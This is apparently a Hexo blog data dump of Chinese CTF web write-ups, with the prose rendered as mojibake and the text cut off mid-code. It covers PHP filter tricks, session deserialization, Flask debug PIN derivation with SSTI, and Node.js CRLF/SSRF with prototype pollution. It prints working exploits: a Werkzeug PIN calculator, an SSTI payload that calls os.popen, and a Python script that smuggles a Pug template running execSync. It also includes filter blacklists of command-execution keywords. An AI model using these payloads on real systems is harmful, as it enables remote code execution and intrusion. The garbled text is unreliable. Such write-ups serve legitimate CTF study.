urlå¦‚ä¸‹ï¼š 1http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;1.php å¾—åˆ°ç»“æœï¼š 1+ADw?php exit()+ADs æ¬¸ï¼Œè¿™æ—¶å€™å°±æœ‰äººå¯èƒ½è¦é—®äº†ï¼Œå¯æ˜¯æˆ‘ä¹Ÿä¸æ‡‚utf-7å•Šï¼Ÿå…¶å®è¿™ä¹Ÿå¾ˆç®€å•ï¼Œä¸æ‡‚æ²¡äº‹ï¼Œåœ¨æœ¬æœºä¸Šå…ˆå°†æƒ³è¦çš„å†…å®¹æ“ä½œä¸€ä¸‹å°±å¥½äº†ï¼š 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;?php phpinfo(); \\n&quot;);?&gt; å¾—åˆ°ï¼š 1+ADw?php phpinfo()+ADs æ¬¸ï¼Œè¿™æ˜¯åˆé‡è§äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªæµå¥½åƒåªèƒ½åŠ å¯†ï¼Œæ²¡åŠæ³•è§£å¯†å•Šï¼Œè¿™æ ·å¯¼è‡´äº†ä¸€ä¸ªå¾ˆå°´å°¬çš„é—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•è¾“å…¥ï¼š 1fwrite($fp, &quot;&lt;?php exit(); +ADw?php phpinfo()+ADs \\n&quot;); è¢«è½¬æ¢ä¹‹åçš„ç»“æœå¹¶éæˆ‘ä»¬æ‰€è®¾æƒ³çš„è½¬æ¢å›å»ï¼Œè€Œæ˜¯ï¼š 1+ADw?php exit()+ADs +-ADw?php phpinfo()+-ADs ä½†æ˜¯è¿™ä¾ç„¶ä¸å¤±ä¸ºä¸€ç§æ˜¯å°†æ­»äº¡exitåˆ æ‰çš„å¥½æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ ·çš„åˆ©ç”¨base64æµç­‰ç­‰æ“ä½œæŠŠä»–è½¬æ¢ä¸€å“ˆ 1http:&#x2F;&#x2F;localhost&#x2F;5.php?0&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.php 123456&lt;?php$a = $_GET[0];$fp = fopen($a, &#x27;w&#x27;);fwrite($fp, &quot;&lt;?php exit();aCjw/cGhwIHBocGluZm8oKTs= \\n&quot;);// è¿™é‡Œçš„aå°±æ˜¯ç”¨äºå¡«å……8å­—èŠ‚çš„?&gt; ä¸€ä¸ªæä¾›å„ç§å­—èŠ‚ç¼–ç çš„ç½‘ç«™ï¼š 1https:&#x2F;&#x2F;www.compart.com&#x2F;en&#x2F;unicode&#x2F; çªç„¶åˆçœ‹åˆ°è¿™ä¸ª 1234https:&#x2F;&#x2F;blog.csdn.net&#x2F;KSroido&#x2F;article&#x2F;details&#x2F;109656236https:&#x2F;&#x2F;github.com&#x2F;USTC-Hackergame&#x2F;hackergame2020-writeups","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"HarezeEasyNotes","slug":"HarezeEasyNotes","date":"2021-05-14T09:09:36.000Z","updated":"2021-05-14T09:56:32.882Z","comments":true,"path":"2021/05/14/HarezeEasyNotes/","link":"","permalink":"http://example.com/2021/05/14/HarezeEasyNotes/","excerpt":"","text":"çŸ¥è¯†ç‚¹ session ååºåˆ—åŒ– ä»£ç å®¡è®¡ åšé¢˜æ€è·¯ï¼šé¢˜ç›®æ˜¯ç»™å‡ºæºç çš„ï¼Œæ¯”è¾ƒå…³é”®çš„ä»£ç åœ¨è¿™é‡Œï¼š 12345678&lt;?phperror_reporting(0);require_once(&#x27;config.php&#x27;);require_once(&#x27;lib.php&#x27;);session_save_path(TEMP_DIR);session_start(); æˆ‘ä»¬éœ€è¦æ˜ç™½PHPçš„sessionå‚¨å­˜æœºåˆ¶ï¼Œå½“PHPå‚¨å­˜sessionçš„æ—¶å€™ï¼Œä¼šåºåˆ—åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå¹¶ä¸”å°†å…¶ä¿å­˜ä¸ºsess_xxxxxç±»å‹çš„æ–‡ä»¶ å°±æ¯”å¦‚è¿™é‡Œçš„å€¼ï¼Œå®é™…ä¸Šå°±æ˜¯ç”±phpè¯»å–äº†sess__29af5bb579395528cbc4b72153afb10b æ–‡ä»¶å¾—æ¥ï¼Œè¿™æ—¶phpå°±ä¼šè¯»å–å…¶ä¸­çš„å€¼äº†ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦ä¼ªé€ çš„è¯æˆ‘ä»¬éœ€è¦çŸ¥é“è·¯å¾„ æ ¹æ®init.phpæˆ‘ä»¬å¾—åˆ° 1234567error_reporting(0);require_once(&#x27;config.php&#x27;);require_once(&#x27;lib.php&#x27;);session_save_path(TEMP_DIR);session_start(); åˆå¯çŸ¥é“ï¼š ä¸‹è½½ä»£ç ä¼šè¯»å–æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶åæ˜¯æ ¹æ®useråå­—æ¥æ§åˆ¶çš„å—ï¼Œè€Œåé¢çš„å†…å®¹åå­—è¯´æ˜¯éšæœºçš„ï¼Œå…¶å®åˆ°å¦é—¨çœ‹å¯ä»¥å‘ç°è¿˜æ˜¯ä¼šè¯»å–å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶- -ï¼Ÿ è€Œè¯»å†™çš„å†…å®¹é€šè¿‡Â·add_noteå‡½æ•°å¯ä»¥æ§åˆ¶ 123456789function add_note($title, $body) &#123; $notes = get_notes(); array_push($notes, [ &#x27;title&#x27; =&gt; $title, &#x27;body&#x27; =&gt; $body, &#x27;id&#x27; =&gt; hash(&#x27;sha256&#x27;, microtime()) ]); $_SESSION[&#x27;notes&#x27;] = $notes;&#125; å†™å…¥å†…å®¹ä¸º xxxx|N;admin|b:1;xxxxxx è®¿é—®export.php type=. è¿™æ ·å­å°±å®Œå…¨æ§åˆ¶äº†æ–‡ä»¶å ä¸‹è½½è¿‡æ¥çš„æ–‡ä»¶ååé¢å°±æ˜¯sessionï¼Œè®¿é—®flagå³å¯","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"å¼ºç½‘æ¯Upload","slug":"å¼ºç½‘æ¯Upload","date":"2021-05-13T17:39:53.000Z","updated":"2021-05-13T17:49:31.618Z","comments":true,"path":"2021/05/14/å¼ºç½‘æ¯Upload/","link":"","permalink":"http://example.com/2021/05/14/%E5%BC%BA%E7%BD%91%E6%9D%AFUpload/","excerpt":"","text":"çŸ¥è¯†ç‚¹ Thinkphp5ååºåˆ—åŒ– Phar æ€è·¯ï¼š ååºåˆ—åŒ–çš„è§¦å‘ï¼Œæ‰¾unserializeï¼Œå‘ç°å¾ˆå·§ 123456789101112public function login_check()&#123; $profile=cookie(&#x27;user&#x27;); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db(&#x27;user&#x27;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#x27;ID&#x27;]))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;&#125; è¿™ç›´æ¥ååºåˆ—åŒ–è§¦å‘äº†ï¼Œé‚£ä¹ˆå†æ‰¾ä¸ªlogin_checkçš„è§¦å‘ç‚¹ 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125;&#125; æ³¨å†Œçš„æ—¶å€™å°±å¯ä»¥è§¦å‘ï¼Œå‘ƒï¼Œæˆ‘ä»¥ä¸ºæ˜¯æ‰“åŸç”Ÿé“¾å­ï¼Œç»“æœå¥½åƒä¸æ˜¯","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"GYCTF2020FlaskApp","slug":"GYCTF2020FlaskApp","date":"2021-05-13T13:55:31.000Z","updated":"2021-05-13T14:49:38.747Z","comments":true,"path":"2021/05/13/GYCTF2020FlaskApp/","link":"","permalink":"http://example.com/2021/05/13/GYCTF2020FlaskApp/","excerpt":"","text":"çŸ¥è¯†ç‚¹ Flask DEbugæ¨¡å¼ SSTI é¢„æœŸ å¤ç°çš„ï¼Œä¸»è¦æ˜¯éœ€è¦åˆ©ç”¨SSTIè·å–å¦‚ä¸‹ä¿¡æ¯ï¼š cat /etc/passwd ä¸‹çš„å½“å‰ç”¨æˆ·å modname ä¸€èˆ¬é»˜è®¤ä¸ºflask.app getattr(app, â€œ__name__â€, app.__class__.__name__)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlask å€¼ä¸€èˆ¬ä¸å˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960+ flaskåº“ä¸‹é¢çš„app.py çš„ç»å¯¹è·¯å¾„ï¼Œä¸€èˆ¬æŠ¥é”™ä¿¡æ¯å°±æ³„éœ²äº†+ å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶ï¼Œè¯»å–&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address å³å¯å¾—åˆ° åˆ©ç”¨pythonè½¬æ¢æˆåè¿›åˆ¶ ![image-20210513224832045](GYCTF2020FlaskApp&#x2F;image-20210513224832045.png)æœºå™¨çš„IDï¼š å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etc&#x2F;machine-idæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚å¯¹äºdockeræœºåˆ™è¯»å–è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroupè·å–get_machine_id()(dockeråé¢é‚£æ®µå­—ç¬¦ä¸²)ï¼šEXP,æŠ“è¿‡æ¥ï¼Œæ‰“&#96;&#96;&#96;pythonimport hashlibfrom itertools import chainprobably_public_bits &#x3D; [ &#39;flaskweb&#39;# username &#39;flask.app&#39;,# modname &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [ &#39;2485377871076&#39;,# str(uuid.getnode()), &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address &#39;bad1f6f0683c071acc834769dff047e264024e2f37e2cb6fb1e77c550c4eb15a&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; bit.encode(&#39;utf-8&#39;) h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None: h.update(b&#39;pinsalt&#39;) num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size &#x3D;&#x3D; 0: rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv &#x3D; numprint(rv) éé¢„æœŸæˆ‘è‡ªå·±åšçš„æ—¶å€™æˆ‘æ˜¯ç›´æ¥éé¢„æœŸäº†ï¼Œä½œè€…çš„è¿‡æ»¤ä¸æ˜¯å¾ˆä¸¥æ ¼å¯¼è‡´æˆ‘ç›´æ¥ç»•è¿‡äº† ssti æŒ¨ä¸ªæ•´è¿‡å»1&#123;&#123;config.__class__.__init__.__globals__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;po&#39;+&#39;pen&#39;](&#39;cat &#x2F;this_is_the_fl[a&#123;1&#125;]g.txt&#39;).read()&#125;&#125; é¢˜ç›®æ˜¯è¿‡æ»¤äº†å¦‚ä¸‹ 12def waf(str): black_list = [&quot;flag&quot;, &quot;os&quot;, &quot;system&quot;, &quot;popen&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;chr&quot;, &quot;request&quot;, &quot;subprocess&quot;, &quot;commands&quot;, &quot;socket&quot;, &quot;hex&quot;, &quot;base64&quot;, &quot;*&quot;, &quot;?&quot;] è¿‡æ»¤äº†? å’Œ * å·ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ä¸­æ‹¬å·ï¼Œè¦çŸ¥é“ï¼Œåœ¨linuxå½“ä¸­æ˜¯å…è®¸ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¯»å–æ–‡ä»¶çš„,åˆ©ç”¨è¿™ä¸ª 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songgj&#x2F;p&#x2F;8906005.html","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"http://example.com/tags/Flask/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"NodeGame","slug":"NodeGame","date":"2021-05-13T12:40:21.000Z","updated":"2021-05-13T13:12:35.216Z","comments":true,"path":"2021/05/13/NodeGame/","link":"","permalink":"http://example.com/2021/05/13/NodeGame/","excerpt":"","text":"çŸ¥è¯†ç‚¹ CRLF å¤´éƒ¨æ³¨å…¥ SSRF PUG æ–‡ä»¶æ‰§è¡Œ æ€è·¯ï¼š é¢˜ç›®æ˜¯ç»™å‡ºæºç çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130var express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;);var http = require(&#x27;http&#x27;);var pug = require(&#x27;pug&#x27;);var morgan = require(&#x27;morgan&#x27;);const multer = require(&#x27;multer&#x27;);app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));app.use(morgan(&#x27;short&#x27;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;); var html = pug.renderFile(file); res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: &#x27;&#x27;, &#125; if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123; obj.msg=&quot;only admin&#x27;s ip can use it&quot; res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = &#x27;upload failed&#x27;; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: &#x27;upload success&#x27;, filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = &#x27;upload failed&#x27;; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get(&#x27;/source&#x27;, function(req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function(req, res) &#123; var q = req.query.q; var resp = &quot;&quot;; if (q) &#123; var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding(&#x27;utf8&#x27;); resp.on(&#x27;error&#x27;, function(err) &#123; if (err.code === &quot;ECONNRESET&quot;) &#123; console.log(&quot;Timeout occurs&quot;); return; &#125; &#125;); resp.on(&#x27;data&#x27;, function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(&quot;search param &#x27;q&#x27; missing!&quot;); &#125;&#125;)function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;) å®¡è®¡æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ˜¯è¿›å…¥file_uploadç›®å½•ä¸‹ä¼ ä¸ªæ–‡ä»¶ã€‚é¢˜ç›®æ˜¯å¼•å…¥äº†pugæ’ä»¶çš„ 1var pug = require(&#x27;pug&#x27;); 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaohuochai&#x2F;p&#x2F;7222227.html è¯¥æ’ä»¶å…è®¸æ’å…¥JSä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å…è®¸JS CRLFçš„é—®é¢˜ï¼š 1https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2894 EXPï¼š 123456789101112131415161718192021222324252627282930313233343536373839import requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(&#x27;\\n&#x27;, &#x27;\\r\\n&#x27;)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(&#x27;\\n&#x27;, &#x27;\\r\\n&#x27;)payload = payload.format(len(body), body) \\ .replace(&#x27;+&#x27;, &#x27;\\u012b&#x27;) \\ .replace(&#x27; &#x27;, &#x27;\\u0120&#x27;) \\ .replace(&#x27;\\r\\n&#x27;, &#x27;\\u010d\\u010a&#x27;) \\ .replace(&#x27;&quot;&#x27;, &#x27;\\u0122&#x27;) \\ .replace(&quot;&#x27;&quot;, &#x27;\\u0a27&#x27;) \\ .replace(&#x27;[&#x27;, &#x27;\\u015b&#x27;) \\ .replace(&#x27;]&#x27;, &#x27;\\u015d&#x27;) \\ + &#x27;GET&#x27; + &#x27;\\u0120&#x27; + &#x27;/&#x27;# print(payload)requests.get( &#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/core?q=&#x27; + payload)print(requests.get( &#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/?action=lethe&#x27;).text)","categories":[],"tags":[{"name":"Node","slug":"Node","permalink":"http://example.com/tags/Node/"}]},{"title":"ç½‘é¼2020Notes","slug":"ç½‘é¼2020Notes","date":"2021-05-13T09:34:57.000Z","updated":"2021-05-13T10:43:27.514Z","comments":true,"path":"2021/05/13/ç½‘é¼2020Notes/","link":"","permalink":"http://example.com/2021/05/13/%E7%BD%91%E9%BC%8E2020Notes/","excerpt":"","text":"çŸ¥è¯†ç‚¹ JSåŸå‹é“¾æ±¡æŸ“ undefsafe çš„CVE å…³äºåŸå‹é“¾ï¼š å…¶å®åŸå‹é“¾è¿™ä¸ªä¸œè¥¿å¦‚æœæ¥è§¦è¿‡jsçš„å¼€å‘å°±å¯ä»¥æ˜ç™½äº†ï¼ŒJavascriptæ˜¯æ²¡æœ‰ç±»çš„æ¦‚å¿µçš„ï¼Œæœ‰çš„åªæœ‰ä¸€ä¸ªç»§æ‰¿é“¾ä¸€æ ·çš„ä¸œè¥¿ï¼Œæ‰€æœ‰çš„ç»§æ‰¿é“¾æœ€ç»ˆåˆä¼šæŒ‡å‘Objectï¼Œè¿™ç§ç‰¹æ€§å¯¼è‡´äº†ä¸€ç§æƒ…å†µï¼Œå½“ç”¨æˆ·å¯ä»¥èµ‹å€¼çš„æ—¶å€™è‹¥å…¶å¯¹ä¸Šçº§èµ‹å€¼ï¼Œä¾¿å¯ä»¥ç›´æ¥å¯¼è‡´åŒçº§ï¼Œæˆ–è€…ä¸‹çº§çš„æ‰€æœ‰å¯¹è±¡éƒ½æ‹¥æœ‰äº†è¿™ä¸ªå±æ€§ï¼Œå…·ä½“å®é™…ä¾‹å­å¦‚ä¸‹ï¼š ä¸¤å¼ å›¾å°±å¾ˆæ¸…æ™°çš„è¡¨è¾¾äº†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå½“é€šè¿‡ 1__proto__ èµ‹å€¼çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨çš„å‘ä¸Šçº§å±æ€§è¿›è¡Œä¸€ä¸ªèµ‹å€¼ï¼Œé‚£ä¹ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªå¯¹è±¡çš„å±æ€§çš„æ—¶å€™ï¼Œè‹¥å…¶æ‹¥æœ‰å±æ€§ï¼Œä¾¿ä¼šä¼˜å…ˆè¾“å‡ºå®ƒçš„å€¼ï¼Œè‹¥å…¶æ²¡æœ‰ï¼Œåˆ™ä¼šæ ¹æ®åŸå‹é“¾å‘çˆ¶ç±»è¯·æ±‚~ï¼Œè€Œæ‰€æœ‰çš„å‡½æ•°çš„æœ€ä¸Šçº§éƒ½æ˜¯Obojectï¼Œæ¢å¥è¯è¯´ï¼Œåªè¦èƒ½å¤Ÿæ§åˆ¶Obojectçš„å€¼ï¼Œå®é™…ä¸Šä¹Ÿå°±å¯ä»¥æ±¡æŸ“æ‰€æœ‰çš„æˆå‘˜å±æ€§äº†ã€‚ æ€è·¯é‚£ä¹ˆå›åˆ°é¢˜ç›®ï¼Œé¢˜ç›®æ˜¯æ”¾å‡ºæºç çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144var express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);const undefsafe = require(&#x27;undefsafe&#x27;);const &#123; exec &#125; = require(&#x27;child_process&#x27;);var app = express();class Notes &#123; constructor() &#123; this.owner = &quot;whoknows&quot;; this.num = 0; this.note_list = &#123;&#125;; &#125; write_note(author, raw_note) &#123; this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;; &#125; get_note(id) &#123; var r = &#123;&#125; undefsafe(r, id, undefsafe(this.note_list, id)); return r; &#125; edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + &#x27;.author&#x27;, author); undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw); &#125; get_all_notes() &#123; return this.note_list; &#125; remove_note(id) &#123; delete this.note_list[id]; &#125;&#125;var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function(req, res, next) &#123; res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);&#125;);app.route(&#x27;/add_note&#x27;) .get(function(req, res) &#123; res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;); &#125;) .post(function(req, res) &#123; let author = req.body.author; let raw = req.body.raw; if (author &amp;&amp; raw) &#123; notes.write_note(author, raw); res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;); &#125; else &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;); &#125; &#125;)app.route(&#x27;/edit_note&#x27;) .get(function(req, res) &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id &amp;&amp; author &amp;&amp; enote) &#123; notes.edit_note(id, author, enote); res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;); &#125; else &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;); &#125; &#125;)app.route(&#x27;/delete_note&#x27;) .get(function(req, res) &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; if (id) &#123; notes.remove_note(id); res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;); &#125; else &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;); &#125; &#125;)app.route(&#x27;/notes&#x27;) .get(function(req, res) &#123; let q = req.query.q; let a_note; if (typeof(q) === &quot;undefined&quot;) &#123; a_note = notes.get_all_notes(); &#125; else &#123; a_note = notes.get_note(q); &#125; res.render(&#x27;note&#x27;, &#123;list: a_note&#125;); &#125;)app.route(&#x27;/status&#x27;) .get(function(req, res) &#123; let commands = &#123; &quot;script-1&quot;: &quot;uptime&quot;, &quot;script-2&quot;: &quot;free -m&quot; &#125;; for (let index in commands) &#123; exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123; if (err) &#123; return; &#125; console.log(`stdout: $&#123;stdout&#125;`); &#125;); &#125; res.send(&#x27;OK&#x27;); res.end(); &#125;)app.use(function(req, res, next) &#123; res.status(404).send(&#x27;Sorry cant find that!&#x27;);&#125;);app.use(function(err, req, res, next) &#123; console.error(err.stack); res.status(500).send(&#x27;Something broke!&#x27;);&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`)) é‚£ä¹ˆæ ¹æ®ä¸Šæ–‡æ‰€è¿°çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªä¼šè¢«åŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„å‡½æ•°ï¼Œèƒ½å¤Ÿæ‰¾åˆ°å‡½æ•°undefsafe 123456789101112get_note(id) &#123; var r = &#123;&#125; undefsafe(r, id, undefsafe(this.note_list, id)); return r;&#125;edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + &#x27;.author&#x27;, author); undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, 